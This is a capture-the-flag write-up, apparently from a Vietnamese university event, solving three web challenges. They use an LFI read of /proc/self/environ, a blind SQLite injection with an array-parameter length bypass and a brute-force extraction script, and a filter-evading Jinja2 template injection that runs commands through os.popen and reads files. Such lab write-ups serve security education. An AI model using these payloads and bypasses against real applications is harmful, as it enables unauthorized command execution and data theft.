# ehc-daicuongtangai

### Idea: 

- LFI to /proc/self (linux)

### Solution:
Visit /robots.txt, thấy được file system của challenge.

Hướng exploit sẽ là biến `poem` vừa được eval() mà user lại có thể control được.

Qua BurpSuite: `localhost:9000/poem?baitho=request.data` / phần body của request điền tên của file cần request. 

Truy cập phlag.txt -> được hint là phlag ở mọi nơi
`/proc/self/environ` sẽ là file cần đọc -> get flag.

### Flag:
`EHCTF{em_c0_the_tan_g3i_EHC_ez_ily}`



# fptu-etilos-crew

### Idea: 

- Blind sqli on Portswigger

### Cách 1: Viết Script

```python
import requests
from urllib.parse import quote
import string

table_name = ""
url = "http://challenge.ctf.ehc-fptu.club:32163/search?name[0]=1"
random = (
    "[" + "]" + "{" + "}" + "(" + ")" + "," + "?" + "^"
    " " + string.digits + string.ascii_letters + "_"
)


# Lấy tên bảng

# for i in range(1, 50):
#     for j in random:
#         add_url = f"' and substr((SELECT group_concat(tbl_name) FROM sqlite_master ),{i},1) like '{j}' -- ;"
#         # add_url = f"' and substr((SELECT name FROM sqlite_master WHERE type='table'),{i},1) like '{j}' -- ;"
#         full = url + add_url
#         # print(full)
#         # print(j)
#         Url = url + quote(add_url)
#         # print(Url)
#         re = requests.get(url=Url)
#         # print(re.text)
#         if '[{"id":1,"joke":' in re.text:
#             table_name += j
#             print(f"Table_Name {i}====> :", table_name)
#             break
#         if i > 48:
#             print(table_name)
#             break

# Lấy flag 
flag = ""
for i in range(1, 50):
    for j in random:
        add_url = f"' and substr((select flag from flag_2330375a_1320_4800_85eb_27e2300b6561),{i},1) like '{j}' --;"
        full = url + add_url
        Url = url + quote(add_url)
        re = requests.get(url=Url)

        if '[{"id":1,"joke"' in re.text:
            flag += j
            print(f"Flag {i}====> :", flag, end="\r")
            break

```

### Cách 2: Giải kiểu cần cù :D

#### Giải thích hướng đi của bài

- Nhìn source app.js thấy dùng SQLite3 db. table name API và flag table có format `flag_` + an UUIDv4 string. Và điều quan trọng, có một trang ẩn khi bạn đọc đoạn code này: 

```js
app.get('/search', (req, res) => {
    const { name } = req.query;
    const Filterduidui = /(union|or|substring|substrs|if|case|=|when|then|join|load_extension|likely|unhex|\|\|)/i;
    if (!name) {
        return res.redirect('/search?name=1');
    }
```


- Check code từ dòng 13 tới 24 và dòng 60 tới 62 
```js
  if (name.length > 6) {
        return res.status(400).send({ err: 'U r hacker?' });
    }
```
chúng ta cần tìm cách bypass length này. Và khi nhập số vào param `/search?name=` ta sẽ nhận được 1 đoạn text bất kỳ trôn trôn :D. Chúng ta đều biết 
đây là một thử thách về SQLi theo tư duy ban đầu sẽ test thử payload `' and 1 is 1--` nhưng input này quá dài vi phạm điều kiện `name.length > 6`. Nhưng site được biết bằng JavaScript và không có kiểm tra input vào parameter là string hay không, thử biến parameter thành array :3

- payload detect lỗi: 
`search?name[]=' and 1 is 1--`
`search?name[]=%27%20and%201%20is%201--`

- Nếu bạn không biết tại sao nó hoạt động thì lý do là JavaScript xác định độ dài của một mảng là tổng số phần tử bên trong nó. Bây giờ ta có thể nhập payload có độ dài tùy ý.

- Từ đây có thể khẳng định bài này dúng Blind SQLi, nhưng keywords `substring` and `substrs` đã bị block. Search document của SQLite thì thấy nó sử dụng keyword
`substr` chứ không dùng `substring` hoặc `substrs`. 

- Tới dây rồi tìm database name length brute-forcing, vì flag table name được tạo ngẫu nhiên bởi function này:
```js
const flagTable = `flag_${uuid.v4().replace(/-/g, '_')}`;
```

- Viết một payload để xác định độ dài của tên bảng: `1' AND (SELECT LENGTH(name) FROM sqlite_master WHERE type is 'table' AND name LIKE 'flag_%') is 1--`
(dùng burp suite cho đỡ tốn time nếu đi theo cách try hard)

-> payload trên sẽ trả về 200 => Payload hoạt động => It's time to brute-force
- Dùng intruder, set the Grep-Match to the string "id":1 as the clue => xác định được độ dài của bảng là 41. Mà theo format trong source đã đó tên 5 chữ cái đầu tiên
trong table flag là `flag_` vậy là có 5 ký tự => Cần tìm 36 kí tự còn lại.

 <!-- Select tablename -->

- 1' and substr((SELECT group_concat(tbl_name) FROM sqlite_master),1,1) like '[' -- ;

- 1%27%20and%20substr((select%20sql%20from%20sqlite_schema),1,1)%20like%20%27C%27%20--%20;


=> with table_name = 'flag_2330375a_1320_4800_85eb_27e2300b6561'

 <!-- Select flag -->

- 1' and substr((select flag from flag_2330375a_1320_4800_85eb_27e2300b6561),1,1) like 'E' --;

- 1%27%20and%20substr((select%20flag%20from%flag_2330375a_1320_4800_85eb_27e2300b6561),1,3)=%22EH{%22%20--;

### Flag: 
`EHCTF{I_th1nk_u_r_so_lite_UwU}`


# ehc-waifu

### Hint: 

- SSTI Jinja2 with [Magic_or_Dunder_Method](https://www.tutorialsteacher.com/python/magic-methods-in-python#:~:text=Magic%20methods%20in%20Python%20are,class%20on%20a%20certain%20action)

## Analysis:

- Description: Chỉ khi bạn giải quyết secret `aUcoNnzcerplVJOgso6hf0KOP9w0aQeNlKEXeNSxcx3MkTfLpVXJRcZh1l6wl1zkjSdAYy5p/X/dhEKaH1ClYfHPCiOuIBunTT1sv+VdAlM=` thì bạn mới có thể tìm được waifu của mình. Waifu của tôi là marin kitagawa, tôi với cô ấy đã bên nhau 256 ngày, thật là một khoảng thời gian thật tuyệt vời. Hãy cẩn thận với những special character như _, nó có thể khiến phải đánh mất tình yêu của đời mình.

Hướng giải: Dùng cipher identifier dễ dàng biết đây là HMAC, đọc kỹ thì sẽ thấy các keyword `256`, `marin kitagawa` => cipher là HMAC-SHA256, secret key `marin kitagawa`.

- giải được secert là `request|config|self|class|flag|0|1|2|3|4|5|6|7|8|9|\"|\'|\\|\~|\%|\#` => SSTI Jinja2 (confirm rằng biết bài filter những gì)

## Exploit:

Chúng ta sẽ dùng những thứ có sẵn trong python(`Python Magic Methods`), Ex: 

 - `().__doc__` trả về doc của tuple "Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the   tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object."
- `().__gt__.__name__` trả về "__gt__"
- `[].__len__()` trả về số phần tử của mảng rỗng là 0
- `[[]].__len__()` trả về 1

- Vừa mò và thử inject payload kết hợp các syntax trên cùng với [os.popen().read()]((https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-ospopenread) `{{cycler.__init__.__globals__.os.popen(().__doc__[[[],[],[]].__len__()]+().__str__.__name__[[[],[]].__len__()]).read()}}` thì bất ngờ tìm được một file có tên flag. 


Tương tự đoạn code trên, mình viết 1 đoạn đoạn code trả về chữ `flag`

```cs
[].__doc__[-[].clear.__name__.__len__()]+\
[].__doc__[[].pop.__name__.__len__()]+\
().__doc__[-[].__getitem__.__name__.__len__()]+\
{}.__new__.__doc__[-[].__init__.__name__.__len__()]
```
- Cuối cùng mình dùng [read remote file] (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---read-remote-file) có inject với payload: `{{a.__init__.__globals__.__builtins__.open([].__doc__[-[].clear.__name__.__len__()]+[].__doc__[[].pop.__name__.__len__()]+().__doc__[-[].__getitem__.__name__.__len__()]+{}.__new__.__doc__[-[].__init__.__name__.__len__()]).read()}}`

### Flag: 
`EHCTF{lam_g1_co_b0ng_tuy3t_nao_tr3ng_ma1_d3u!}` 

